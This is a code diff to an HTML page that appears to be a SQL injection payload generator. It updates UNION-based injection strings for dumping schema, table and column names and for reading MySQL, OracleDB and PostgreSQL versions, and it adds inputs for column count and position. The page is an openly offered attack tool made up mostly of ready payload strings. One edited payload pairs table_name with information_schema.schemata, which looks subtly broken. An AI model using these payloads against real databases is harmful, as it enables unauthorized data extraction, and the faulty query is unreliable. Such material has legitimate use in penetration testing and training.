@@ -976,9 +976,9 @@
               <div class="tab">Union Data Dump 3</div>
               <div class="tab">Union Data Dump 4</div>
               <div class="tab">Union Custom Data Dump</div>
-              <div class="tab">Union Select Database Version 1</div>
-              <div class="tab">Union Select Database Version 2</div>
-              <div class="tab">Union Select Database Version 3</div>
+              <div class="tab">Union Select Database Version MySQL</div>
+              <div class="tab">Union Select Database Version OracleDB</div>
+              <div class="tab">Union Select Database Version PostgreSQL</div>
             </div>
 
             <div class="content-container scroll">
@@ -1047,7 +1047,7 @@
               </script>
 
               <div class="content">
-                <h3>Union Select Injection</h3>
+                <h3>Union Select Null</h3>
                 <div class="input-group">
                   <span class="input-group-text">Query:</span>
                   <div class="form-floating">
@@ -1102,7 +1102,7 @@
                   <span class="input-group-text">Query:</span>
                   <div class="form-floating">
                     <input type="text" class="form-control-plaintext" id="Union-Query-4"
-                      value="1' UNION SELECT * FROM information_schema.tables--" readonly />
+                      value="1' UNION SELECT schema_name FROM information_schema.schemata--" readonly />
                     <label for="Union-Query-4">SQL</label>
                   </div>
                   <div class="copy">
@@ -1111,9 +1111,21 @@
                     </button>
                   </div>
                 </div>
-                <div class="row">
+                <div class="row mt-3">
                   <div class="col">
-                    <div class="input-group mt-3">
+                    <div class="input-group">
+                      <label for="Total-Columns-Schema" class="input-group-text">Total Columns:</label>
+                      <input type="number" id="Total-Columns-Schema" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="Schema-Column" class="input-group-text">Schema Name Column:</label>
+                      <input type="number" id="Schema-Column" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
                       <label for="comment-options-3" class="input-group-text">Comment Type:</label>
                       <select class="form-control" id="comment-options-3">
                         <option>--</option>
@@ -1122,34 +1134,19 @@
                       </select>
                     </div>
                   </div>
-                  <div>
-                    <br>
-                    <button class="back-button" type="button" onclick="generateUnionDumpInformationSchema()">Generate
-                      Query</button>
-                  </div>
+                </div>
+                <div>
+                  <br>
+                  <button class="back-button" type="button" onclick="generateUnionDumpInformationSchema()">Generate
+                    Query</button>
                 </div>
                 <div class="explanation">
-                  <p><strong>1' UNION SELECT * FROM information_schema.tables-- :</strong> This query attempts to
-                    perform a
-                    Union Select Injection by appending a UNION SELECT statement to retrieve all columns from the
-                    'information_schema.tables' table, which contains metadata about database tables.</br></br>
-                    The user can select a comment type to be appended to the injection query, allowing for customization
-                    based on the SQL dialect being targeted.
-                  </p>
+                  <p>This section allows for the dynamic generation of a SQL injection query aimed at extracting schema
+                    names from the database. The user can customize the number of columns and select which column will
+                    display the 'schema_name'.</p>
                 </div>
               </div>
 
-              <script>
-                function generateUnionDumpInformationSchema() {
-                  var commentOption = document.getElementById('comment-options-3').value;
-
-                  var unionQuery = "1' UNION SELECT * FROM information_schema.tables" + commentOption;
-                  document.getElementById('Union-Query-9').value = unionQuery;
-
-                  // Show the explanation
-                  document.querySelector('.explanation').style.display = 'block';
-                }
-              </script>
 
               <div class="content">
                 <h3>Union Dump Table Names</h3>
@@ -1157,7 +1154,7 @@
                   <span class="input-group-text">Query:</span>
                   <div class="form-floating">
                     <input type="text" class="form-control-plaintext" id="Union-Query-5"
-                      value="1' UNION SELECT * FROM information_schema.tables WHERE table_name = 'Users'--" readonly />
+                      value="1' UNION SELECT table_name FROM information_schema.schemata--" readonly />
                     <label for="Union-Query-5">SQL</label>
                   </div>
                   <div class="copy">
@@ -1166,41 +1163,42 @@
                     </button>
                   </div>
                 </div>
-                <div class="row">
+                <div class="row mt-3">
                   <div class="col">
-                    <div class="input-group mt-3">
-                      <label for="TableName" class="input-group-text">Table Name:</label>
-                      <input type="text" id="TableName" class="form-control" placeholder="e.g., Users">
+                    <div class="input-group">
+                      <label for="Total-Columns-Table" class="input-group-text">Total Columns:</label>
+                      <input type="number" id="Total-Columns-Table" class="form-control" value="1" min="1">
                     </div>
                   </div>
                   <div class="col">
-                    <div class="input-group mt-3">
-                      <label for="comment-options-4" class="input-group-text">Comment Type:</label>
-                      <select class="form-control" id="comment-options-4">
+                    <div class="input-group">
+                      <label for="Table-Column" class="input-group-text">Table Name Column:</label>
+                      <input type="number" id="Table-Column" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="comment-options-5" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-5">
                         <option>--</option>
                         <option>#</option>
                         <option>/*</option>
                       </select>
                     </div>
                   </div>
-                  <div>
-                    <br>
-                    <button class="back-button" type="button" onclick="generateUnionInfoSchemaTable()">Generate
-                      Query</button>
-                  </div>
+                </div>
+                <div>
+                  <br>
+                  <button class="back-button" type="button" onclick="generateUnionInfoSchemaTable()">Generate
+                    Query</button>
                 </div>
                 <div class="explanation">
-                  <p><strong>1' UNION SELECT * FROM information_schema.tables WHERE table_name = 'Users'-- :</strong>
-                    This query
-                    attempts to perform a Union Select Injection by appending a UNION SELECT statement to retrieve all
-                    columns from
-                    the 'information_schema.tables' table, filtered by the specified table name.</br></br>
-                    The user can input the table name and select a comment type to be appended to the injection query,
-                    allowing for
-                    customization based on the SQL dialect being targeted.
-                  </p>
+                  <p>This section allows for the dynamic generation of a SQL injection query aimed at extracting table
+                    names from a specified position within the database. The user can customize the number of columns
+                    and select which column will display the 'table_name'.</p>
                 </div>
               </div>
+
 
               <div class="content">
                 <h3>Union Dump Column Names</h3>
@@ -1218,41 +1216,50 @@
                     </button>
                   </div>
                 </div>
-                <div class="row">
+                <div class="row mt-3">
                   <div class="col">
-                    <div class="input-group mt-3">
-                      <label for="TableName" class="input-group-text">Table Name:</label>
-                      <input type="text" id="TableName" class="form-control" placeholder="e.g., users">
+                    <div class="input-group">
+                      <label for="Total-Columns" class="input-group-text">Total Columns:</label>
+                      <input type="number" id="Total-Columns" class="form-control" value="1" min="1">
                     </div>
                   </div>
                   <div class="col">
-                    <div class="input-group mt-3">
-                      <label for="comment-options-5" class="input-group-text">Comment Type:</label>
-                      <select class="form-control" id="comment-options-5">
+                    <div class="input-group">
+                      <label for="Column-Name-Position" class="input-group-text">Column Name Position:</label>
+                      <input type="number" id="Column-Name-Position" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                </div>
+                <div class="row mt-3">
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="UserTableName" class="input-group-text">Table Name:</label>
+                      <input type="text" id="UserTableName" class="form-control" placeholder="e.g., users">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="comment-options-6" class="input-group-text">Comment Type:</label>
+                      <select class="form-control" id="comment-options-6">
                         <option>--</option>
                         <option>#</option>
                         <option>/*</option>
                       </select>
                     </div>
                   </div>
-                  <div>
-                    <br>
-                    <button class="back-button" type="button" onclick="generateUnionInfoSchemaColumn()">Generate
-                      Query</button>
-                  </div>
+                </div>
+                <div>
+                  <br>
+                  <button class="back-button" type="button" onclick="generateUnionInfoSchemaColumn()">Generate
+                    Query</button>
                 </div>
                 <div class="explanation">
-                  <p><strong>1' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users'--
-                      :</strong> This
-                    query attempts to perform a Union Select Injection by appending a UNION SELECT statement to retrieve
-                    column names
-                    from the 'information_schema.columns' table, filtered by the specified table name.</br></br>
-                    The user can input the table name and select a comment type to be appended to the injection query,
-                    allowing for
-                    customization based on the SQL dialect being targeted.
-                  </p>
+                  <p>This section allows for the dynamic generation of a SQL injection query aimed at extracting column
+                    names from the specified table within the database. The user can customize the number of columns,
+                    select which column will display the 'column_name', and input the table name.</p>
                 </div>
               </div>
+
 
 
               <div class="content">
@@ -1650,7 +1657,7 @@
               </script>
 
               <div class="content">
-                <h3>Union Select Database Version 1</h3>
+                <h3>Union Select Database Version (MySQL)</h3>
                 <div class="input-group">
                   <span class="input-group-text">Query:</span>
                   <div class="form-floating">
@@ -1664,9 +1671,22 @@
                     </button>
                   </div>
                 </div>
-                <div class="row">
+                <div class="row mt-3">
                   <div class="col">
-                    <div class="input-group mt-3">
+                    <div class="input-group">
+                      <label for="Total-Columns-Version-MySQL" class="input-group-text">Total Columns:</label>
+                      <input type="number" id="Total-Columns-Version-MySQL" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="Version-Column-Position-MySQL" class="input-group-text">Version Column
+                        Position:</label>
+                      <input type="number" id="Version-Column-Position-MySQL" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
                       <label for="comment-options-11" class="input-group-text">Comment Type:</label>
                       <select class="form-control" id="comment-options-11">
                         <option value="--">--</option>
@@ -1678,19 +1698,19 @@
                 </div>
                 <div>
                   <br>
-                  <button class="back-button" type="button" onclick="generateVersionQuery1()">Generate
+                  <button class="back-button" type="button" onclick="generateVersionQueryMySQL()">Generate
                     Query</button>
                 </div>
                 <div class="explanation">
-                  <p><strong>' UNION SELECT @@version-- :</strong> This query template is designed to extract the
-                    database version using the `@@version` function in SQL. By appending a UNION SELECT statement, it
-                    combines the query with the specified comment type to bypass filters or restrictions and retrieve
-                    sensitive information.</p>
+                  <p>This dynamic tool allows users to generate a UNION SELECT query to extract the database version,
+                    specifically tailored to MySQL's <code>@@version</code>. Users can specify the total number of
+                    columns in the result set and select which column will display the version information.</p>
                 </div>
               </div>
 
+
               <div class="content">
-                <h3>Union Select Database Version 2</h3>
+                <h3>Union Select Database Version (OracleDB)</h3>
                 <div class="input-group">
                   <span class="input-group-text">Query:</span>
                   <div class="form-floating">
@@ -1704,38 +1724,50 @@
                     </button>
                   </div>
                 </div>
-                <div class="row">
+                <div class="row mt-3">
                   <div class="col">
-                    <div class="input-group mt-3">
+                    <div class="input-group">
+                      <label for="Total-Columns-Version-Oracle" class="input-group-text">Total Columns:</label>
+                      <input type="number" id="Total-Columns-Version-Oracle" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="Version-Column-Position-Oracle" class="input-group-text">Version Column
+                        Position:</label>
+                      <input type="number" id="Version-Column-Position-Oracle" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
                       <label for="comment-options-12" class="input-group-text">Comment Type:</label>
                       <select class="form-control" id="comment-options-12">
-                        <option value="--">--</option>
-                        <option value="#">#</option>
-                        <option value="/*">/*</option>
+                        <option>--</option>
+                        <option>#</option>
+                        <option>/*</option>
                       </select>
                     </div>
                   </div>
                 </div>
                 <div>
                   <br>
-                  <button class="back-button" type="button" onclick="generateVersionQuery2()">Generate
-                    Query</button>
+                  <button class="back-button" type="button" onclick="generateVersionOracleDB()">Generate Query</button>
                 </div>
                 <div class="explanation">
-                  <p><strong>' UNION SELECT * FROM v$version-- :</strong> This query template is designed to retrieve
-                    the database version using the `v$version` table or view in SQL. By appending a UNION SELECT
-                    statement with wildcard (*) selection, it combines the query with the specified comment type to
-                    bypass filters or restrictions and fetch sensitive information.</p>
+                  <p>This dynamic tool allows users to generate a UNION SELECT query to extract the OracleDB version.
+                    Users can specify the total number of columns in the result set and select which column will display
+                    the version information from the <code>v$version</code> view.</p>
                 </div>
               </div>
 
+
               <div class="content">
-                <h3>Union Select Database Version 3</h3>
+                <h3>Union Select Database Version (PostgreSQL)</h3>
                 <div class="input-group">
                   <span class="input-group-text">Query:</span>
                   <div class="form-floating">
                     <input type="text" class="form-control-plaintext" id="Union-Query-13"
-                      value="' UNION SELECT * FROM version()--" readonly />
+                      value="' UNION SELECT version()--" readonly />
                     <label for="Union-Query-13">SQL</label>
                   </div>
                   <div class="copy">
@@ -1744,9 +1776,22 @@
                     </button>
                   </div>
                 </div>
-                <div class="row">
+                <div class="row mt-3">
                   <div class="col">
-                    <div class="input-group mt-3">
+                    <div class="input-group">
+                      <label for="Total-Columns-Version-PGSQL" class="input-group-text">Total Columns:</label>
+                      <input type="number" id="Total-Columns-Version-PGSQL" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
+                      <label for="Version-Column-Position-PGSQL" class="input-group-text">Version Column
+                        Position:</label>
+                      <input type="number" id="Version-Column-Position-PGSQL" class="form-control" value="1" min="1">
+                    </div>
+                  </div>
+                  <div class="col">
+                    <div class="input-group">
                       <label for="comment-options-13" class="input-group-text">Comment Type:</label>
                       <select class="form-control" id="comment-options-13">
                         <option value="--">--</option>
@@ -1758,16 +1803,16 @@
                 </div>
                 <div>
                   <br>
-                  <button class="back-button" type="button" onclick="generateVersionQuery3()">Generate
+                  <button class="back-button" type="button" onclick="generateVersionQueryPGSQL()">Generate
                     Query</button>
                 </div>
                 <div class="explanation">
-                  <p><strong>' UNION SELECT * FROM version()-- :</strong> This query template is designed to retrieve
-                    the database version using the `version()` function in SQL. By appending a UNION SELECT statement
-                    with wildcard (*) selection from the version function, it combines the query with the specified
-                    comment type to bypass filters or restrictions and fetch sensitive information.</p>
+                  <p>This dynamic tool allows users to generate a UNION SELECT query to extract the PostgreSQL version
+                    using the <code>version()</code> function. Users can specify the total number of columns in the
+                    result set and select which column will display the version information.</p>
                 </div>
               </div>
+
 
 
 
